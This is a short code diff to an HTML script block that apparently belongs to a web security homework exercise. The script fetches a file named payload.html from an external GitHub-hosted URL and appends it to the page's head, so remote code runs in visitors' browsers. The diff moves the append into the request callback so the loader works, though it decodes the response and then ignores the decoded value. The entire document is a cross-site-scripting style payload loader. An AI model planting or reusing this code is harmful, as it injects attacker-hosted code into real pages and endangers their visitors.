@@ -1,6 +1,6 @@
 <script>
 $.get("https://raw.githubusercontent.com/Cictrone/PWAS-HW6/master/payload.html", function(d){
   var s = atob(d);
+  $('head').append(d)
 });
-$('head').append(d)
 </script>
